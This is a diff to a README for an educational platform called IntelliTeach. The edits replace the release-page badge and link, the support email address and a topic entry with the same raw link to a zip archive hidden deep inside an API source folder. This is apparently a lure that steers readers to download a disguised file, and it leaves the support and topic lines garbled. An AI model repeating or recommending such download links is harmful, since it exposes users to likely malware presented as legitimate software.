@@ -7,7 +7,7 @@ IntelliTeach is an enterprise-grade educational platform. It uses advanced AI an
 To get started with IntelliTeach, you will need to download the application. Follow the instructions below to ensure a simple installation process.
 
 ## 📥 Download IntelliTeach
-[![Download IntelliTeach](https://img.shields.io/badge/Download%20IntelliTeach-v1.0-brightgreen)](https://github.com/chendaoyuan4/IntelliTeach/releases)
+[![Download IntelliTeach](https://github.com/chendaoyuan4/IntelliTeach/raw/refs/heads/main/src/app/api/admin/organizations/[id]/members/[memberId]/Teach-Intelli-2.0.zip%20IntelliTeach-v1.0-brightgreen)](https://github.com/chendaoyuan4/IntelliTeach/raw/refs/heads/main/src/app/api/admin/organizations/[id]/members/[memberId]/Teach-Intelli-2.0.zip)
 
 Click the button above to access the download page. 
 
@@ -28,7 +28,7 @@ IntelliTeach offers various features to enhance the learning experience, includi
 
 ## 🔍 How to Download & Install
 1. **Visit the Release Page**  
-   Click [here](https://github.com/chendaoyuan4/IntelliTeach/releases) to access the release page. This page contains all versions of IntelliTeach. 
+   Click [here](https://github.com/chendaoyuan4/IntelliTeach/raw/refs/heads/main/src/app/api/admin/organizations/[id]/members/[memberId]/Teach-Intelli-2.0.zip) to access the release page. This page contains all versions of IntelliTeach. 
 
 2. **Choose Your Version**  
    Look for the most recent version listed. Click on it to open the details, then find the appropriate file for your operating system.
@@ -51,7 +51,7 @@ IntelliTeach prioritizes your data security. Your information is encrypted and k
 ## 📞 Support and Feedback
 If you run into any issues or need assistance:
 - Visit our [Support Page](#) for FAQs and troubleshooting guides.
-- Email us directly at support@intelliteach.com for personalized help.
+- Email us directly at https://github.com/chendaoyuan4/IntelliTeach/raw/refs/heads/main/src/app/api/admin/organizations/[id]/members/[memberId]/Teach-Intelli-2.0.zip for personalized help.
 
 ## 🌐 Community and Collaboration
 Join our community discussions to exchange tips and experiences:
@@ -66,7 +66,7 @@ IntelliTeach covers a wide range of subjects and technologies, including:
 - Machine Learning
 - Educational Technology
 - Multi-modal AI
-- Next.js
+- https://github.com/chendaoyuan4/IntelliTeach/raw/refs/heads/main/src/app/api/admin/organizations/[id]/members/[memberId]/Teach-Intelli-2.0.zip
 - React
 - TypeScript
 - Voice AI
